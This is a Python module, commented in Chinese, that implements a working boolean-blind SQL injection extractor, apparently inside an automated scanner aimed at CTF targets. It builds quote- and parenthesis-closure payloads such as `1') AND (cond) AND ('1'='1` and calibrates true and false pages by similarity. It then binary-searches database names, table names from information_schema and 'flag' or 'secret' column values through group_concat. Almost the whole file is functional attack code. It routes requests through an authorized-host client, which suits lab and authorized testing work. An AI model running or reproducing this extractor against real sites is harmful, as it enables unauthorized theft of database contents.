# -*- coding: utf-8 -*-
"""AI/规则布尔盲注自测：不依赖 sqlmap，按已确认 Payload 适配引号语境。

2026-11-07 增强（SuperSQLInjection 思路）：
  - 判据从「整页 md5 + 长度全等」改为「归一化页面相似度对比」：
    真/假各取 2 次参考页，用 sim_true - sim_false 判真假，动态页不再必瞎；
  - 灰区自动重测 + 每 N 个字符重校准，避免判据漂移；
  - 每个字符提取后做一次等值复核（治「读错字符」），复核失败重搜，仍失败即停；
  - 值预测：库名先按候选一击验证（命中再做同构假条件对照），失败再二分；
  - 取 flag：直接布尔提取 `information_schema.columns` → `group_concat`，
    比 sqlmap 布尔 `--dump`（300s 常跑不完）快得多；
  - 请求走 prober._build_request（GET/POST/body 全支持），仍强制 SafeHttpClient。

支持引号语境：
  - 双引号：1" and ({cond}) and "1"="1
  - 单引号：1' and ({cond}) and '1'='1
  - 注释收尾：1' and ({cond})--
"""
from __future__ import annotations

import difflib
import re
import statistics
import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from app.services.event_bus import bus

# 动态内容归一化：时间戳 / 长 hex / CSRF 值 / 纯数字 id，避免整页指纹漂移
_DYN_PATTERNS = (
    re.compile(r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?\b"),
    re.compile(r"\b[0-9a-f]{16,}\b", re.I),
    re.compile(r"""name=["'](?:csrf|_token|token)[^"']*["']\s+value=["'][^"']*["']""", re.I),
    re.compile(r"\b\d{10,13}\b"),
)

_MARGIN = 0.06           # 相似度差阈值：低于该值视为灰区
_RECAL_EVERY = 8         # 每提取 N 个字符重校准一次
_CTRL_TRIES = 2          # 灰区最多重测次数

_DB_CANDIDATES = (
    "information_schema", "mysql", "performance_schema", "sys", "test",
    "security", "challenges", "dvwa", "pikachu",
    "app", "websec", "root",
)

# 表/列名清单（与 blind_extract 保持同一表达式，避免两套口径）
from app.services.blind_extract import (  # noqa: E402
    _COLS_EXPR_MYSQL,
    _COLS_EXPR_MYSQL_FILTERED,
    _score_column,
)


# 闭合语境表：key -> (闭合符, 尾部)。价值在于 `')` / `")`（引号+闭括号）——
# 实测 2026-11-07 目标确认 payload 为 `1") AND ... AND ("x"="x`，
# 只试 1' / 1" / 注释三种语境永远校准失败（SuperSQLInjection 的边界推断）。
_STYLES = {
    "single": ("'", " and '1'='1"),
    "double": ('"', ' and "1"="1'),
    # 闭括号语境：尾部必须**开一个括号但不闭合**，交给原查询末尾的 `)` 闭合
    # （sqlmap 形态：1") AND (...) AND ("x"="x  —— 少写 `(` 会多出一个右括号，
    #  true/false 都变语法错误页，校准必失败。2026-11-07 实测）
    "paren_single": ("')", " and ('1'='1"),
    "paren_double": ('")', ' and ("1"="1'),
    "single_comment": ("'", " COMMENT"),
    "double_comment": ('"', " COMMENT"),
    "paren_single_comment": ("')", " COMMENT"),
    "paren_double_comment": ('")', " COMMENT"),
}


def infer_quote_style(payload: str | None) -> str:
    """兼容旧接口：返回最可能的单一样式。"""
    return infer_styles(payload)[0]


def infer_styles(payload: str | None) -> list[str]:
    """从已确认 payload 推断闭合语境，并按可能性排序。"""
    p = (payload or "").replace(" ", "")
    styles: list[str] = []
    if '")' in p:
        styles += ["paren_double", "paren_double_comment"]
    if "')" in p:
        styles += ["paren_single", "paren_single_comment"]
    if '"' in (payload or ""):
        styles += ["double", "double_comment"]
    if "'" in (payload or ""):
        styles += ["single", "single_comment"]
    for s in ("single", "double", "paren_single", "paren_double",
              "single_comment", "double_comment",
              "paren_single_comment", "paren_double_comment"):
        if s not in styles:
            styles.append(s)
    return styles


def wrap_condition(base: str, cond: str, style: str) -> str:
    closure, tail = _STYLES.get(style, _STYLES["single"])
    if tail == " COMMENT":
        return f"{base}{closure} AND ({cond})-- -"
    return f"{base}{closure} AND ({cond}){tail}"


def _normalize_body(body: str) -> str:
    t = (body or "")[:20000]
    for p in _DYN_PATTERNS:
        t = p.sub("", t)
    return re.sub(r"\s+", " ", t).strip()


def _similarity(a: str, b: str) -> float:
    na, nb = _normalize_body(a), _normalize_body(b)
    if not na and not nb:
        return 1.0
    if not na or not nb:
        return 0.0
    return difflib.SequenceMatcher(None, na[:8000], nb[:8000]).ratio()


def _sql_literal(value: str) -> str:
    return "'" + str(value).replace("'", "''") + "'"


class BooleanBlindExtractor:
    def __init__(self, client, url: str, param: str = "id", base_value: str = "1",
                 quote_style: str = "single", task_id: int | None = None,
                 endpoint=None, verify: bool = True, deadline: float | None = None,
                 progress_cb=None):
        # 所有请求必须走 SafeHttpClient：授权 host 校验 + 限速 + 熔断 + 审计。
        if client is None:
            raise ValueError("BooleanBlindExtractor 需要 SafeHttpClient（禁止裸 httpx）")
        self.client = client
        self.url = url
        self.param = param
        self.base_value = base_value
        self.quote_style = quote_style
        self.task_id = task_id
        self.endpoint = endpoint          # 有则按方法/参数位置正确构造请求（GET/POST/body）
        self.verify = verify
        self.requests = 0
        self.true_refs: list[str] = []
        self.false_refs: list[str] = []
        self.mode = "sim"                # sim | kw
        self.true_fp: str | None = None   # 兼容旧字段
        self.false_fp: str | None = None
        self.error: str | None = None
        self.partial = False
        self.last_payload = ""
        self.last_length: int | None = None   # 当前表达式已确认的总长度（续跑用）
        self.deadline = deadline          # time.monotonic() 基准的绝对时间戳
        self.progress_cb = progress_cb    # 每提取一个字符回调（实时汇报/心跳）

    def _expired(self) -> bool:
        if self.deadline and time.monotonic() > self.deadline:
            self.error = self.error or "deadline"
            return True
        return False

    def close(self):
        # 客户端由调用方持有，这里不关闭
        return None

    # ---------------- 请求 ----------------
    def _request(self, payload: str) -> tuple[int, str]:
        self.requests += 1
        self.last_payload = payload
        if self.endpoint is not None:
            from app.services.prober import _build_request
            url, params, data = _build_request(self.endpoint, self.param, payload)
            resp = self.client.request(
                self.endpoint.method, url, params=params, data=data,
                payload=payload,
                headers={"User-Agent": "mhszed-sql-ai-blind/0.4"})
        else:
            # 兼容旧调用：URL 查询参数形态
            parsed = urlparse(self.url)
            q = dict(parse_qsl(parsed.query, keep_blank_values=True))
            q[self.param] = payload
            new = urlunparse(parsed._replace(query=urlencode(q)))
            resp = self.client.request("GET", new, payload=payload,
                                       headers={"User-Agent": "mhszed-sql-ai-blind/0.4"})
        if getattr(resp, "status_code", 200) in (403, 406, 429):
            self.error = f"waf_blocked(status={resp.status_code})"
        return resp.status_code, resp.text or ""

    def _request_retry(self, payload: str) -> tuple[int, str]:
        """请求失败重试一次：目标偶发超时不应中止整轮提取。"""
        try:
            return self._request(payload)
        except Exception:
            time.sleep(1.0)
            return self._request(payload)

    # ---------------- 校准 ----------------
    def _refresh_refs(self) -> bool:
        t_refs, f_refs = [], []
        for _ in range(2):
            if self._expired():
                return False
            try:
                _, tb = self._request_retry(
                    wrap_condition(self.base_value, "1=1", self.quote_style))
                _, fb = self._request_retry(
                    wrap_condition(self.base_value, "1=2", self.quote_style))
            except Exception as exc:
                self.error = str(exc)
                return False
            t_refs.append(tb)
            f_refs.append(fb)
        if self.error and "waf_blocked" in (self.error or ""):
            return False
        # 参考页自身要稳定；真假页要可区分
        t_stable = min((_similarity(t_refs[0], t_refs[1]), 1.0)) if len(t_refs) > 1 else 1.0
        tf_gap = max(_similarity(t, f) for t in t_refs for f in f_refs)
        if tf_gap < 0.98 and t_stable >= 0.85:
            self.true_refs, self.false_refs = t_refs, f_refs
            self.mode = "sim"
            return True
        # 相似度不可分：退回关键字判据（旧行为）
        if self._keyword_calibrate(t_refs[0], f_refs[0]):
            self.true_refs, self.false_refs = t_refs, f_refs
            self.mode = "kw"
            return True
        bus.publish("scan",
                    f"[AI盲注] 校准失败：真假页不可区分（tf_gap={tf_gap:.3f} "
                    f"t_stable={t_stable:.3f}）",
                    task_id=self.task_id, level="warn")
        return False

    def _keyword_calibrate(self, tbody: str, fbody: str) -> bool:
        def kw(b: str) -> bool | None:
            if any(x in b for x in ('"exists":true', "用户存在", "存在记录", "查询成功")):
                return True
            if any(x in b for x in ('"exists":false', "用户不存在", "不存在", "无结果", "Not Found")):
                return False
            return None

        kt, kf = kw(tbody), kw(fbody)
        if kt is True and kf is False:
            self.true_fp, self.false_fp = "kw:true", "kw:false"
            bus.publish("scan", "[AI盲注] 关键字校准成功", task_id=self.task_id, level="success")
            return True
        return False

    def calibrate(self) -> bool:
        ok = self._refresh_refs()
        if ok:
            bus.publish("scan", f"[AI盲注] 校准成功 style={self.quote_style} mode={self.mode}",
                        task_id=self.task_id, level="success")
        return ok

    # ---------------- 判据 ----------------
    def _classify(self, body: str) -> bool | None:
        if self.mode == "kw":
            if any(x in body for x in ('"exists":true', "用户存在", "存在记录", "查询成功")):
                return True
            if any(x in body for x in ('"exists":false', "用户不存在", "不存在", "无结果")):
                return False
            return None
        if not self.true_refs or not self.false_refs:
            return None
        st = max(_similarity(body, r) for r in self.true_refs)
        sf = max(_similarity(body, r) for r in self.false_refs)
        if st - sf >= _MARGIN:
            return True
        if sf - st >= _MARGIN:
            return False
        # 相似度灰区：用长度辅助（真/假页长度稳定时可救）
        lt = statistics.median(len(r) for r in self.true_refs)
        lf = statistics.median(len(r) for r in self.false_refs)
        if abs(lt - lf) >= 2:
            dt, df = abs(len(body) - lt), abs(len(body) - lf)
            if dt + 2 < df:
                return True
            if df + 2 < dt:
                return False
        return None

    def _inject(self, condition: str) -> bool | None:
        """发一次布尔条件；灰区重测 / 重校准；仍灰返回 None（上层中止，不猜）。"""
        if self._expired():
            return None
        payload = wrap_condition(self.base_value, condition, self.quote_style)
        for _ in range(_CTRL_TRIES):
            try:
                _, body = self._request_retry(payload)
            except Exception as exc:
                self.error = str(exc)
                bus.publish("scan", f"[AI盲注] 请求失败: {exc}", task_id=self.task_id, level="warn")
                return None
            if self.error and "waf_blocked" in (self.error or ""):
                return None
            verdict = self._classify(body)
            if verdict is not None:
                return verdict
        # 灰区：重校准一次再判
        if self._refresh_refs():
            try:
                _, body = self._request_retry(payload)
            except Exception as exc:
                self.error = str(exc)
                return None
            verdict = self._classify(body)
            if verdict is not None:
                return verdict
        bus.publish("scan", f"[AI盲注] 灰区无法判定，中止本步: {condition[:60]}",
                    task_id=self.task_id, level="warn")
        return None

    # ---------------- 二分 ----------------
    def _binsearch_len(self, expr: str, max_len: int = 64) -> int | None:
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi + 1) // 2
            v = self._inject(f"length(({expr}))>={mid}")
            if v is None:
                return None
            if v:
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _binsearch_ascii(self, expr: str, pos: int) -> int | None:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            v = self._inject(f"ascii(substr(({expr}),{pos},1))>={mid}")
            if v is None:
                return None
            if v:
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _char_ok(self, expr: str, pos: int, code: int) -> bool | None:
        """等值复核：治「二分读错字符」。None=无法判定。"""
        if not self.verify:
            return True
        return self._inject(f"ascii(substr(({expr}),{pos},1))={code}")

    def _verify_prefix(self, expr: str, prefix: str) -> bool:
        """续跑前抽样复核前缀（前 2 + 后 4 字符），防上次误判被永久继承。"""
        if not prefix:
            return True
        if not self.verify:
            return True
        n = len(prefix)
        positions = sorted({1, 2, *range(max(1, n - 3), n + 1)})
        for i in positions:
            if 1 <= i <= n:
                got = self._inject(f"ascii(substr(({expr}),{i},1))={ord(prefix[i - 1])}")
                if got is not True:
                    return False
        return True

    def _extract_expr_raw(self, expr: str, max_len: int = 40,
                          prefix: str = "", known_length: int | None = None) -> str:
        # partial 是「当前表达式」的状态，不能从上一个表达式继承
        self.partial = False
        # 断点续跑：prefix 是上次已复核过的字符，known_length 是上次已取到的总长度
        self.last_length = known_length
        length = known_length
        if length is None:
            length = self._binsearch_len(expr, max_len=max_len)
            self.last_length = length
        if length is None:
            self.partial = True
            return ""
        if length <= 0:
            return ""
        length = min(length, max_len)
        self.last_length = length
        chars: list[str] = list((prefix or "")[:length])
        for i in range(len(chars) + 1, length + 1):
            if self._expired():
                self.partial = True
                break
            code = self._binsearch_ascii(expr, i)
            if code is None or not (32 <= code <= 126):
                self.partial = True
                break
            ok = self._char_ok(expr, i, code)
            if ok is False:
                # 复核失败：重搜一次
                code2 = self._binsearch_ascii(expr, i)
                if code2 is None or code2 != code or self._char_ok(expr, i, code2) is not True:
                    self.partial = True
                    break
            elif ok is None:
                self.partial = True
                break
            chars.append(chr(code))
            if self.requests % _RECAL_EVERY == 0:
                self._refresh_refs()
            if self.progress_cb:
                try:
                    self.progress_cb("".join(chars))
                except Exception:
                    pass
            if len(chars) % 4 == 0:
                bus.publish("scan", f"[AI盲注] 提取中 {''.join(chars)}",
                            task_id=self.task_id)
        return "".join(chars)

    def extract_expr(self, expr: str, max_len: int = 40, label: str = "",
                     candidates: list[str] | None = None,
                     prefix: str = "", known_length: int | None = None) -> str:
        bus.publish("scan", f"[AI盲注] 提取 {label or expr}", task_id=self.task_id)
        if prefix or known_length is not None:
            return self._extract_expr_raw(expr, max_len=max_len, prefix=prefix,
                                          known_length=known_length)
        # 值预测：先按候选一击验证
        for cand in (candidates or []):
            if self._expired():
                break
            v = self._inject(f"({expr})={_sql_literal(cand)}")
            if v is True:
                # 保存“命中”这一枪的 payload；后面的假对照会覆盖 last_payload，
                # 不能把对照条件当取数 payload 展示。
                _pos_payload = self.last_payload
                ctrl = self._inject(f"({expr})={_sql_literal(cand + '__x')}")
                if ctrl is not True:
                    self.last_payload = _pos_payload
                    bus.publish("scan", f"[AI盲注] 值预测命中 {label or expr}={cand}",
                                task_id=self.task_id, level="success")
                    self.last_length = len(cand)
                    return cand
        return self._extract_expr_raw(expr, max_len=max_len)

    def extract_database(self) -> str:
        return self.extract_expr("database()", max_len=32, label="database()",
                                 candidates=list(_DB_CANDIDATES))

    def extract_tables(self, max_tables: int = 8) -> list[str]:
        count_expr = (
            "select count(*) from information_schema.tables where table_schema=database()"
        )
        lo, hi = 0, max_tables
        while lo < hi:
            mid = (lo + hi + 1) // 2
            v = self._inject(f"({count_expr})>={mid}")
            if v is None:
                return []
            if v:
                lo = mid
            else:
                hi = mid - 1
        n = min(lo, max_tables)
        tables = []
        for idx in range(n):
            expr = (
                f"select table_name from information_schema.tables "
                f"where table_schema=database() limit {idx},1"
            )
            name = self.extract_expr(expr, max_len=40, label=f"table[{idx}]",
                                     candidates=["flag", "users", "admin", "secret", "user"])
            if name:
                tables.append(name)
            else:
                break
        return tables

    def extract_flag(self, max_len: int = 120, resume: dict | None = None) -> dict:
        """布尔盲注直接取 flag：先找 flag/secret 列，再 group_concat 取值。

        resume={table,column,value,length,expr}：上次超时中断的部分结果，
        复核前缀一致后从断点继续；不一致则放弃续跑、从头提取。
        """
        if resume and resume.get("table") and resume.get("column"):
            table, column = resume["table"], resume["column"]
            expr = f"(select group_concat(`{column}` separator 0x7c) from `{table}`)"
            _prev_expr = resume.get("expr") or ""
            if _prev_expr and _prev_expr != expr:
                resume = None
            elif resume.get("value") and not self._verify_prefix(expr, resume["value"]):
                bus.publish("scan", "[AI盲注] 续跑前缀复核不一致，放弃续跑、重新提取",
                            task_id=self.task_id, level="warn")
                resume = None
        if resume and resume.get("table"):
            table, column = resume["table"], resume["column"]
            expr = f"(select group_concat(`{column}` separator 0x7c) from `{table}`)"
            val = self.extract_expr(expr, max_len=max_len,
                                    label=f"flag {table}.{column}（续跑）",
                                    prefix=resume.get("value") or "",
                                    known_length=resume.get("length"))
            _meta = {"table": table, "column": column, "columns": "",
                     "expr": expr, "length": getattr(self, "last_length", None)}
            if val and not self.partial and not self.error:
                return {"value": val, "partial": False, "error": None, **_meta}
            return {"value": val, "partial": True,
                    "error": self.error or "value_partial", **_meta}
        cols_raw = self.extract_expr(_COLS_EXPR_MYSQL_FILTERED, max_len=96,
                                     label="columns(flag/secret)") or ""
        if self.partial or self.error:
            # 列清单不完整：继续取数会把 id 之类当 flag（2026-11-07 实测拿到 "1"）
            return {"value": "", "table": "", "column": "", "columns": cols_raw,
                    "partial": True, "error": self.error or "columns_partial"}
        if not cols_raw:
            cols_raw = self.extract_expr(_COLS_EXPR_MYSQL, max_len=128,
                                         label="columns(all)") or ""
            if self.partial or self.error:
                return {"value": "", "table": "", "column": "", "columns": cols_raw,
                        "partial": True, "error": self.error or "columns_partial"}
        pairs: list[tuple[str, str]] = []
        for item in cols_raw.split(","):
            if ":" in item:
                t, c = item.split(":", 1)
                if t and c:
                    pairs.append((t.strip(), c.strip()))
        if not pairs:
            return {"value": "", "table": "", "column": "", "columns": cols_raw,
                    "error": self.error or "columns_empty"}
        pairs.sort(key=lambda tc: -_score_column(*tc))
        # goal=flag：只从命中 flag/secret/key 关键词的列取值，避免把 id 当 flag
        scored = [tc for tc in pairs if _score_column(*tc) > 0]
        candidates = scored or pairs
        if not scored:
            return {"value": "", "table": "", "column": "", "columns": cols_raw,
                    "error": "no_flag_column"}
        for table, column in candidates[:3]:
            expr = f"(select group_concat(`{column}` separator 0x7c) from `{table}`)"
            val = self.extract_expr(expr, max_len=max_len,
                                    label=f"flag {table}.{column}")
            _meta = {"table": table, "column": column, "columns": cols_raw,
                     "expr": expr, "length": getattr(self, "last_length", None)}
            if val and not self.partial and not self.error:
                return {"value": val, "partial": False, "error": None, **_meta}
            if self.partial or self.error:
                # 超时/异常：已复核过的字符保留为“部分结果”，由上层明确标注
                return {"value": val, "partial": True,
                        "error": self.error or "value_partial", **_meta}
        return {"value": "", "table": "", "column": "", "columns": cols_raw,
                "partial": False, "error": self.error or "value_empty"}


def run_boolean_fallback(url: str, param: str, task_id: int | None = None,
                         want_tables: bool = True, payload_hint: str | None = None,
                         base_value: str = "1", *, client,
                         endpoint=None, want_flag: bool = False,
                         verify: bool = True, deadline: float | None = None,
                         known_db: str = "", progress_cb=None,
                         flag_resume: dict | None = None) -> dict:
    """AI/规则布尔自测入口。client 必须是 SafeHttpClient。"""
    # 按已确认 payload 的闭合语境排序；payload 缺失时依次尝试
    # 单引号 / 双引号 / 闭括号 / 注释各变体（SuperSQLInjection 边界推断思路）。
    styles = infer_styles(payload_hint)

    last_err = None
    total_requests = 0
    for style in styles:
        ex = BooleanBlindExtractor(
            client=client, url=url, param=param or "id", base_value=base_value or "1",
            quote_style=style, task_id=task_id, endpoint=endpoint, verify=verify,
            deadline=deadline, progress_cb=progress_cb,
        )
        try:
            if not ex.calibrate():
                last_err = f"style={style} 校准失败"
                continue
            # 历史深挖已拿到库名时直接复用，省一轮请求
            p_db = ""
            if known_db:
                dbname = known_db
            else:
                dbname = ex.extract_database()
                p_db = ex.last_payload or ""      # 取库名时用的 payload
            db_partial = (not known_db) and bool(getattr(ex, "partial", False))
            tables: list[str] = []
            p_tables = ""
            if dbname and want_tables and not db_partial:
                tables = ex.extract_tables()
                if tables:
                    p_tables = ex.last_payload or ""
            flag = ""
            flag_partial = ""
            flag_meta: dict = {}
            flag_err = ""
            p_flag = ""
            if want_flag and dbname and not db_partial:
                fr = ex.extract_flag(resume=flag_resume)
                flag_meta = fr
                flag_err = fr.get("error") or ""
                if fr.get("value") and not fr.get("partial") and not fr.get("error"):
                    flag = fr["value"]        # 只有完整且无错才当 flag
                else:
                    flag_partial = fr.get("value") or ""
                # 只有真的取到 flag/部分 flag 时，最后一条 payload 才是取 flag payload；
                # 没有结果时 ex.last_payload 可能是取表/取列的语句，不能挂到 flag 下面
                if flag or flag_partial:
                    p_flag = ex.last_payload or ""
            return {
                "db": dbname, "tables": tables, "requests": ex.requests,
                "quote_style": style, "db_partial": db_partial,
                "error": ex.error or flag_err,
                "flag": flag, "flag_partial": flag_partial,
                "flag_table": flag_meta.get("table", ""),
                "flag_column": flag_meta.get("column", ""),
                "flag_length": flag_meta.get("length"),
                "flag_expr": flag_meta.get("expr", ""),
                "columns": flag_meta.get("columns", ""),
                # 每个结果对应自己的取数 payload（前端按结果分组展示）
                "payload_db": p_db,
                "payload_tables": p_tables,
                "payload_flag": p_flag,
                "partial": getattr(ex, "partial", False),
                "payload": ex.last_payload,
            }
        except Exception as e:
            last_err = str(e)
        finally:
            total_requests += ex.requests
            ex.close()
    return {"db": "", "tables": [], "requests": total_requests,
            "error": last_err or "全部语境校准失败"}
